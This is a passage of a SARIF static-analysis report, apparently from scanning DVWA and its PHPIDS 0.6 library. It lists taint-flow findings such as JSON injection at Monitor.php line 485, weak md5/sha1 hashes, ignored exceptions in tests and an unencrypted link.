                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 259
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:313 - _jsondecodevalues(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 313
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:485 - json_decode(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 485
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4487",
      "message" : {
        "text" : "On line 485 of Monitor.php, the method _jsondecodevalues() writes unvalidated input into JSON. This call could allow an attacker to inject arbitrary elements or attributes into the JSON entity.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "570418F5FA12A2F882569B0D7FFC3EC7"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
          },
          "region" : {
            "startLine" : 485,
            "endLine" : 485,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "example.php:43 - Read $_GET"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 43
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:485 - json_decode(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 485
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:43 - Read $_GET"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 43
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:41 - Assignment to $request"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 41
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:68 - init^(0 : this->request)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 68
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:68 - Assignment to $ids"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 68
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:69 - run(this->request)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 69
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:236 - each(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 236
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:236 - Assignment to $value"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 236
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:237 - _iterate(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 237
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:259 - _detect(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 259
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:313 - _jsondecodevalues(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 313
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:485 - json_decode(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 485
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4536",
      "message" : {
        "text" : "On line 485 of Monitor.php, the method _jsondecodevalues() writes unvalidated input into JSON. This call could allow an attacker to inject arbitrary elements or attributes into the JSON entity.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "6E9F21F73B98B2C07A1F028CD0A67680"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
          },
          "region" : {
            "startLine" : 485,
            "endLine" : 485,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "dvwaPhpIds.inc.php:62 - Read $_REQUEST"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPhpIds.inc.php"
                },
                "region" : {
                  "startLine" : 62
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:485 - json_decode(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 485
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPhpIds.inc.php:62 - Read $_REQUEST"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPhpIds.inc.php"
                },
                "region" : {
                  "startLine" : 62
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPhpIds.inc.php:61 - Assignment to $request"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPhpIds.inc.php"
                },
                "region" : {
                  "startLine" : 61
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPhpIds.inc.php:75 - init^(0 : this->request)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPhpIds.inc.php"
                },
                "region" : {
                  "startLine" : 75
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPhpIds.inc.php:75 - Assignment to $ids"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPhpIds.inc.php"
                },
                "region" : {
                  "startLine" : 75
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPhpIds.inc.php:76 - run(this->request)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPhpIds.inc.php"
                },
                "region" : {
                  "startLine" : 76
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:236 - each(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 236
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:236 - Assignment to $value"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 236
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:237 - _iterate(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 237
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:259 - _detect(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 259
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:313 - _jsondecodevalues(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 313
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:485 - json_decode(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 485
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4688",
      "message" : {
        "text" : "On line 485 of Monitor.php, the method _jsondecodevalues() writes unvalidated input into JSON. This call could allow an attacker to inject arbitrary elements or attributes into the JSON entity.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "D817056D578964FEA3AD33FB5F603889"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
          },
          "region" : {
            "startLine" : 485,
            "endLine" : 485,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "example.php:45 - Read $_COOKIE"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 45
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:485 - json_decode(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 485
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:45 - Read $_COOKIE"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 45
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:41 - Assignment to $request"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 41
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:68 - init^(0 : this->request)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 68
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:68 - Assignment to $ids"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 68
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:69 - run(this->request)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 69
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:236 - each(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 236
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:236 - Assignment to $value"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 236
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:237 - _iterate(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 237
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:259 - _detect(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 259
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:313 - _jsondecodevalues(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 313
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:485 - json_decode(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 485
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4713",
      "message" : {
        "text" : "On line 485 of Monitor.php, the method _jsondecodevalues() writes unvalidated input into JSON. This call could allow an attacker to inject arbitrary elements or attributes into the JSON entity.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "E8A4D3926AB180BCA95F12FA3412FABB"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
          },
          "region" : {
            "startLine" : 485,
            "endLine" : 485,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "example.php:42 - Read $_REQUEST"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 42
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:485 - json_decode(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 485
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:42 - Read $_REQUEST"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 42
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:41 - Assignment to $request"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 41
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:68 - init^(0 : this->request)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 68
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:68 - Assignment to $ids"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 68
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:69 - run(this->request)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 69
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:236 - each(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 236
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:236 - Assignment to $value"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 236
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:237 - _iterate(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 237
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:259 - _detect(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 259
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:313 - _jsondecodevalues(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 313
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:485 - json_decode(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 485
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4714",
      "message" : {
        "text" : "On line 485 of Monitor.php, the method _jsondecodevalues() writes unvalidated input into JSON. This call could allow an attacker to inject arbitrary elements or attributes into the JSON entity.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "E909440420883E5872BEB2D8138FD058"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
          },
          "region" : {
            "startLine" : 485,
            "endLine" : 485,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "dvwaPhpIds.inc.php:64 - Read $_POST"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPhpIds.inc.php"
                },
                "region" : {
                  "startLine" : 64
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:485 - json_decode(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 485
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPhpIds.inc.php:64 - Read $_POST"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPhpIds.inc.php"
                },
                "region" : {
                  "startLine" : 64
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPhpIds.inc.php:61 - Assignment to $request"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPhpIds.inc.php"
                },
                "region" : {
                  "startLine" : 61
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPhpIds.inc.php:75 - init^(0 : this->request)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPhpIds.inc.php"
                },
                "region" : {
                  "startLine" : 75
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPhpIds.inc.php:75 - Assignment to $ids"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPhpIds.inc.php"
                },
                "region" : {
                  "startLine" : 75
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPhpIds.inc.php:76 - run(this->request)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPhpIds.inc.php"
                },
                "region" : {
                  "startLine" : 76
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:236 - each(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 236
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:236 - Assignment to $value"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 236
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:237 - _iterate(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 237
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:259 - _detect(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 259
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:313 - _jsondecodevalues(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 313
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:485 - json_decode(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 485
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4424",
      "message" : {
        "text" : "Weak cryptographic hashes cannot guarantee data integrity and should not be used in security-critical contexts.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "2468EE89409E00284055D26C35A5749C"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/lib/IDS/vendors/htmlpurifier/HTMLPurifier/Config.php"
          },
          "region" : {
            "startLine" : 162,
            "endLine" : 162,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "Config.php:162 - md5()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/vendors/htmlpurifier/HTMLPurifier/Config.php"
                },
                "region" : {
                  "startLine" : 162
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Config.php:162 - md5()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/vendors/htmlpurifier/HTMLPurifier/Config.php"
                },
                "region" : {
                  "startLine" : 162
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4473",
      "message" : {
        "text" : "Weak cryptographic hashes cannot guarantee data integrity and should not be used in security-critical contexts.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "491218F4701AA86656C9661B80748CB2"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/lib/IDS/vendors/htmlpurifier/HTMLPurifier/Config.php"
          },
          "region" : {
            "startLine" : 173,
            "endLine" : 173,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "Config.php:173 - md5()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/vendors/htmlpurifier/HTMLPurifier/Config.php"
                },
                "region" : {
                  "startLine" : 173
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Config.php:173 - md5()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/vendors/htmlpurifier/HTMLPurifier/Config.php"
                },
                "region" : {
                  "startLine" : 173
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4431",
      "message" : {
        "text" : "Weak cryptographic hashes cannot guarantee data integrity and should not be used in security-critical contexts.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "2D5146C71940FDE8200F25DAB646B654"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/lib/IDS/vendors/htmlpurifier/HTMLPurifier/URIFilter/Munge.php"
          },
          "region" : {
            "startLine" : 49,
            "endLine" : 49,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "Munge.php:49 - sha1()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/vendors/htmlpurifier/HTMLPurifier/URIFilter/Munge.php"
                },
                "region" : {
                  "startLine" : 49
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Munge.php:49 - sha1()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/vendors/htmlpurifier/HTMLPurifier/URIFilter/Munge.php"
                },
                "region" : {
                  "startLine" : 49
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4387",
      "message" : {
        "text" : "The method testexceptions() in FilterTest.php ignores an exception on line 65, which could cause the program to overlook unexpected states and conditions.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "12857B5AEC964B62E97B7FFD8A814577"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/tests/IDS/FilterTest.php"
          },
          "region" : {
            "startLine" : 65,
            "endLine" : 65,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "FilterTest.php:65 - CatchBlock"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/IDS/FilterTest.php"
                },
                "region" : {
                  "startLine" : 65
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "FilterTest.php:65 - CatchBlock"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/IDS/FilterTest.php"
                },
                "region" : {
                  "startLine" : 65
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4388",
      "message" : {
        "text" : "The method testexceptions() in FilterTest.php ignores an exception on line 71, which could cause the program to overlook unexpected states and conditions.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "12857B5AEC964B62E97B7FFD8A814578"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/tests/IDS/FilterTest.php"
          },
          "region" : {
            "startLine" : 71,
            "endLine" : 71,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "FilterTest.php:71 - CatchBlock"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/IDS/FilterTest.php"
                },
                "region" : {
                  "startLine" : 71
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "FilterTest.php:71 - CatchBlock"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/IDS/FilterTest.php"
                },
                "region" : {
                  "startLine" : 71
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4389",
      "message" : {
        "text" : "The method testexceptions() in FilterTest.php ignores an exception on line 76, which could cause the program to overlook unexpected states and conditions.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "12857B5AEC964B62E97B7FFD8A814579"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/tests/IDS/FilterTest.php"
          },
          "region" : {
            "startLine" : 76,
            "endLine" : 76,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "FilterTest.php:76 - CatchBlock"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/IDS/FilterTest.php"
                },
                "region" : {
                  "startLine" : 76
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "FilterTest.php:76 - CatchBlock"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/IDS/FilterTest.php"
                },
                "region" : {
                  "startLine" : 76
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4763",
      "message" : {
        "text" : "The file MonitorTest.php on line 1198 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "FEF7E47D79559BC47E66776442EE15F8"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/tests/IDS/MonitorTest.php"
          },
          "region" : {
            "startLine" : 1198,
            "endLine" : 1198,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "MonitorTest.php:1198"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/IDS/MonitorTest.php"
                },
                "region" : {
                  "startLine" : 1198
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "MonitorTest.php:1198"
              },
              "physicalLocation" : {
